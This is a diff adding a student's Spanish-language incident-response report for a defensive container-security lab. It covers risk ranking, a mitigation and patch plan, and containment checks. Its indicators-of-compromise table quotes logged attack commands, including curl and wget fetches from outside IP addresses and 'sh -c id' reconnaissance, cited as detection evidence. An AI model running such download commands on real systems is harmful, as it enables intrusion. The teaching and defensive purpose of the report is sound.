@@ -1,4 +1,4 @@
-﻿# Informe individual — TP PHP2Shell / Node2Shell
+# Informe individual — TP PHP2Shell / Node2Shell
 
 **Integrante:** _Ulises Mateo Bucchino_
 **Usuario de GitHub:** _ulisesutnfrlp7_
@@ -70,11 +70,74 @@ Supongamos una vulnerabilidad hipotética **CVE-2026-115560** en un motor de pla
 
 # Informe individual — TP PHP2Shell / Node2Shell
 
-**Integrante:** -
-**Usuario de GitHub:** -
-**Rol en el TP:** -
-**Fecha:** -
+**Integrante:** _Valentín Garzaniti_
+**Usuario de GitHub:** _Vgarzaniti_
+**Rol en el TP:** _contencion-comunicacion_
+**Fecha:** 29/10/2026
 **Grupo:** 08
+
+---
+
+## 1. Situación y riesgo
+
+En el relevamiento del laboratorio se evaluaron tres servicios desplegados en la red interna `labnet` (`internal: true`, sin puertos publicados al host):
+
+| Servicio | Versión inicial | Hallazgo principal | Riesgo |
+|----------|----------------|--------------------|--------|
+| Portal PHP (`php-lab`) | PHP 8.3.35 | `session.upload_progress.enabled = 1` activo en versión previa a 8.3.36 | Alto — RCE sin autenticación con explotación real confirmada (CISA KEV) |
+| API Node.js (`node-lab`) | Node v22.23.3 | Decoder brotli 1.1.0 embebido en el runtime (endpoint `/decode`) | Medio — Vulnerable a CVE-2026-111497, sin explotación activa confirmada |
+| Servicio Python (`py-lab`) | Python 3.11.18 | Paquete `brotli` 1.0.9 desactualizado | Medio — Vulnerable a CVE-2026-111497 en servicio interno |
+
+El riesgo más alto recae sobre el Portal PHP (`php-lab`), ya que combina versiones previas a 8.3.36 con `session.upload_progress.enabled = 1`. Aunque en el escenario actual los contenedores no están publicados a Internet, un compromiso inicial o un cambio en el despliegue (por ejemplo, agregar un proxy inverso) permitiría ejecutar comandos en el contenedor y pivotar dentro de la red interna hacia `node-lab` y `py-lab`.
+
+## 2. Plan priorizado
+
+Se ejecutó un plan en tres pasos, priorizando la reducción inmediata de superficie y la verificación de contención antes del parcheo definitivo:
+
+| Acción | Activo | Plazo | Dueño | Reversión |
+|--------|--------|-------|-------|-----------|
+| 1. Mitigación en configuración (`session.upload_progress.enabled = 0` en `php.ini` y reinicio) | Portal PHP (`php-lab`) | Inmediato (primeros 15 min) | Cambios / Parche | `git checkout -- laboratorio/php/php.ini` y `docker compose restart php-lab` |
+| 2. Verificación de controles de contención (`./scripts/verificar-contencion.sh`) | `php-lab`, `node-lab`, `py-lab` | Inmediato (primeros 30 min) | Contención / Comunicación | Ajustar directiva en `docker-compose.yml` y recrear el servicio |
+| 3. Parcheo de versiones a PHP 8.3.36, Node v22.23.4 y brotli 1.2.1 (`./scripts/parchear.sh`) | `php-lab`, `node-lab`, `py-lab` | En el día | Cambios / Parche | Volver a tags anteriores con `PHP_TAG` / `NODE_TAG` en `versions.env` y `docker compose up` |
+
+**Justificación:** si un parche de proveedor demorara hasta una ventana de cambio posterior, la mitigación en `php.ini` junto con los controles de contención (`internal: true`, `read_only: true`, `cap_drop: ALL` y límites de recursos) reducen de inmediato el impacto potencial sin interrumpir el servicio.
+
+## 3. Indicadores de compromiso (IoC)
+
+Del análisis de `laboratorio/logs/audit.log` y `./scripts/detectar.sh` surgen señales claras de ejecución anómala en los tres servicios de aplicación, diferenciadas de actividad administrativa normal:
+
+| Timestamp | Host | Padre → hijo | Comando observado | Evaluación |
+|-----------|------|--------------|-------------------|------------|
+| 2026-10-27T09:42:17Z | web01 | apache2 → sh | `sh -c id` | Compromiso (worker web lanzando shell) |
+| 2026-10-27T09:42:40Z | db01 | sshd → bash | `-bash` | Posible falso positivo (sesión SSH administrativa) |
+| 2026-10-27T09:43:03Z | api01 | node → sh | `sh -c curl http://198.51.100.7/x` | Compromiso (intento de descarga externa) |
+| 2026-10-27T09:44:22Z | web01 | apache2 → wget | `wget http://198.51.100.9/a` | Compromiso (intento de descarga externa) |
+| 2026-10-27T09:45:10Z | svc01 | python → sh | `sh -c uname -a` | Compromiso (reconocimiento local) |
+
+**Qué confirma o descarta el incidente:** que `apache2`, `node` o `python` ejecuten `sh`, `curl` o `wget` confirma ejecución de comandos. En cambio, la verificación de contención (`SIN SALIDA` en los tres contenedores) permite confirmar a gerencia que los intentos de descargar etapas adicionales desde `198.51.100.7` y `198.51.100.9` quedan bloqueados por la red `internal: true`.
+
+**Limitaciones del log:** `audit.log` no informa qué usuario ejecutó el proceso, qué IP originó la petición HTTP ni el resultado de red del comando ejecutado.
+
+## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)
+
+Frente a una vulnerabilidad nueva como **CVE-2026-115560** (por ejemplo, un defecto adicional en el manejo de sesiones o subida de archivos en PHP o en un componente de decodificación HTTP):
+
+- **Qué evaluar primero:** identificar mediante inventario automatizado qué activos tienen habilitada la directiva o dependencia afectada y si reciben tráfico no confiable.
+- **Cómo priorizar y contener:** aun cuando el parche oficial no esté disponible el primer día, se aplica primero el control de configuración (deshabilitar la función no esencial o rechazar cabeceras como `Content-Encoding: br` en el borde) y se verifica que el contenedor mantenga `read_only: true`, `cap_drop: ALL` y red sin salida a Internet.
+- **Qué cambia en el plan:** con la contención verificada de antemano, la comunicación al comité de crisis pasa de una parada de emergencia a una ventana de cambio programada con riesgo acotado y prueba de reversión lista.
+
+## 5. Lecciones aprendidas
+
+1. **Contención como red de seguridad real:** cuando un servicio sufre ejecución remota (`curl`/`wget` en `audit.log`), el bloqueo de salida (`internal: true`) y el filesystem en solo lectura (`read_only: true`) cortan la cadena de ataque antes de que descargue herramientas o persista en disco.
+2. **Mitigar en minutos, parchear con verificación:** deshabilitar `session.upload_progress.enabled` en `php.ini` neutraliza el vector principal mientras se reconstruyen y validan las imágenes con `./scripts/parchear.sh`.
+3. **Reducir superficie innecesaria:** si un servicio interno no necesita recibir cuerpos comprimidos con Brotli, rechazar `Content-Encoding: br` evita exponer el decoder de `node-lab` y `py-lab`.
+4. **Separar ruido de hallazgos reales:** distinguir un `sshd → bash` en `db01` de un `apache2 → sh` en `web01` evita falsas alarmas durante la respuesta al incidente.
+5. **Comunicación ejecutiva clara:** a gerencia se le informa impacto, estado de contención comprobado (`SIN SALIDA`), ventana de parcheo y plan de vuelta atrás, sin exponer detalles técnicos innecesarios hacia afuera.
+
+## 6. Qué no se pudo probar
+
+- Acceso real desde red externa al laboratorio (no hay salida a Internet ni proxy público en el entorno aislado).
+- Explotación activa de las vulnerabilidades (el TP es estrictamente defensivo y se trabajó únicamente sobre los contenedores provistos por la cátedra).
 
 -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.
 
